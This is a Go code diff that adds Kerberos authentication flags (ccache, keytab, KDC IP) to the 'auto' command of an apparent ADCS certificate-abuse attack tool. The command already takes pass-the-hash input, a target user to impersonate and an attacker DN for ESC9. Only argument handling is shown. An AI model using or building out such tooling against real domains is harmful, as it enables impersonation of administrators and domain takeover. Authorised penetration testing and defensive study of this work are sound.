@@ -24,6 +24,10 @@ Examples:
 		username, _ := cmd.Flags().GetString("username")
 		password, _ := cmd.Flags().GetString("password")
 		hash, _ := cmd.Flags().GetString("hash")
+		kerberos, _ := cmd.Flags().GetBool("kerberos")
+		ccache, _ := cmd.Flags().GetString("ccache")
+		keytabPath, _ := cmd.Flags().GetString("keytab")
+		kdcIP, _ := cmd.Flags().GetString("dc-ip")
 		upn, _ := cmd.Flags().GetString("upn")
 		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
 		outputDir, _ := cmd.Flags().GetString("output-dir")
@@ -33,8 +37,8 @@ Examples:
 		if targetDC == "" || domain == "" {
 			return fmt.Errorf("--target-dc and --domain are required")
 		}
-		if username == "" || (password == "" && hash == "") {
-			return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH>)")
+		if !kerberos && (username == "" || (password == "" && hash == "")) {
+			return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
 		}
 		if upn == "" {
 			return fmt.Errorf("--upn is required (target user to impersonate, e.g. administrator@%s)", domain)
@@ -50,6 +54,7 @@ Examples:
 			ADCSConfig: &pki.ADCSConfig{
 				TargetDC: targetDC, Domain: domain,
 				Username: username, Password: password, Hash: hash,
+				Kerberos: kerberos, CCache: ccache, Keytab: keytabPath, KDCIP: kdcIP,
 			},
 			TargetUPN:   upn,
 			AttackerDN:  attackerDN,
@@ -80,6 +85,10 @@ func init() {
 	autoCmd.Flags().StringP("username", "u", "", "Domain username")
 	autoCmd.Flags().StringP("password", "p", "", "Domain password")
 	autoCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash")
+	autoCmd.Flags().BoolP("kerberos", "k", false, "Use Kerberos authentication (GSSAPI/SPNEGO)")
+	autoCmd.Flags().String("ccache", "", "Path to Kerberos ccache file (default: KRB5CCNAME env)")
+	autoCmd.Flags().String("keytab", "", "Path to Kerberos keytab file")
+	autoCmd.Flags().String("dc-ip", "", "KDC IP address (if different from --target-dc)")
 	autoCmd.Flags().String("upn", "", "Target UPN to impersonate (required)")
 	autoCmd.Flags().String("attacker-dn", "", "Attacker's LDAP DN (needed for ESC9)")
 	autoCmd.Flags().String("output-dir", "./out", "Output directory for certs")
